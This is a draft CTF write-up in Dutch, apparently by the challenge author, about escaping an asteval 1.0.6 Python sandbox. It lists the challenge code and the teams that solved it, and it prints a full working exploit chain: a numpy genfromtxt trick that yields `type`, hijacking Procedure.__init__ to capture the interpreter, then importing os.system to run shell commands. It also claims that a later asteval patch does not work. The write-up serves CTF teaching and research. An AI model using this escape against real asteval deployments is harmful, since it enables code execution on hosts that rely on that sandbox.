Insert screenshot van de challenge description

Handout: `chal.py`, `Dockerfile`, `compose.yml`, `getflag.c`

`asteval==1.0.6`, de nieuwste release.

TODO: Context from UofTCTF

```python
import asteval

# With this many functions from numpy removed there definitely will not be a way for users to get to `type()`, which is a security risk
asteval.astutils.NUMPY_TABLE = {k: asteval.astutils.NUMPY_TABLE[k] for k in ["genfromtxt"]}

def get_input():
    print("Give input, end with a line of $END$")
    inp = ""
    while True:
        temp = input()
        if temp == "$END$":
            break
        inp += temp +"\n"
    return inp

def nope(text):
    if not text.isascii():
        quit("Sorry, only ascii!")
    if any([text.find(x) >= 0 for x in ["yt", "ty", "rm", "uf", "**"]]):
        quit('Sorry, those bigrams just give me bad vibes!')

def main():
    inp = get_input()
    nope(inp)
    asteval.Interpreter().eval(inp, raise_errors=True)

if __name__ == "__main__":
    main()
```

Heel janky library, heleboel bugs en 0days aanwezig. numpy geeft huge attack surface, dus het was best een uitdaging om mensen de juiste richting in te duwen van de intended en de unintendeds te filteren zonder dat het super arbitrair wordt.
Ben ook niet helemaal tevreden door deze filters sinds ze nogal arbitrair zijn, het gaat om de sandbox escape en niet om het bypassen van mijn filters, zoals het geval zou zijn bij e.g. de leuke jailctf pyjails.
TODO uitleggen hoe de challenge tot stand is gekomen / waar de specifieke filters voor zijn:
byte, bytearray, format, buffer, dict unpacking for kwargs which would bypass names that would be filtered otherwise (since strings can be constructed to bypass the filter).

Tijdens de CTF is hij twee keer opgelost, door bekenden in de pyjail-scene, Lyndon van Maple Mallard Magistrates en oh_word, van Infobahn.
Lyndon gebruikte een f-string-gebaseerde methode (met de breder bekende methode van AttributeError.obj om een waarde uit een format string te redden) die erg leek op de oplossing van een van de chals voor UofTCTF.
Ik ken de techniek, na UofTCTF is er een patch geweest naar asteval die bedoeld was om het te fixen. Die blijkt niet te werken.
In mijn locale testing-setup werkte het niet (waarschijnlijk omdat ik op een oudere versie van python zat dan op de remote), waardoor ik het niet aan de filters heb toegevoegd.
oh_word heeft de intended route voor `type` gevonden, en daarna memory exploitation gedaan.

```python
# Get `type` primitive
def id(x):
    return x

genfromtxt.view = id
ma = genfromtxt(["1"], usemask=True)
mf = ma.flat
mf.maskiter = None
mf.ma = "foo"
mf.dataiter = [genfromtxt]
str = mf[0]

mf.ma = str
t = mf[0]
```

```python
# Get Procedure class object
def f():
    pass
p = t(f)

# Obtain the Interpreter instance
def stealer(name, interp, doc=None, lineno=None,
                 body=None, text=None, args=None, kwargs=None,
                 vararg=None, varkws=None):
    print(interp)
    kwargs[0][1].append(interp)
p.__init__ = stealer
rescuelist = []
def g(rescue=rescuelist):
    pass
i = rescuelist[0]
print(i)
```

```python
# Import and escape the jail
i.import_module("os",["sys"],["system"])
sys("echo hi mom")
sys("/getflag")
print()
```

`kalmar{d0nt_play_w1th_5n4kes_if_you_don7_h4ve_gl0v3s}`
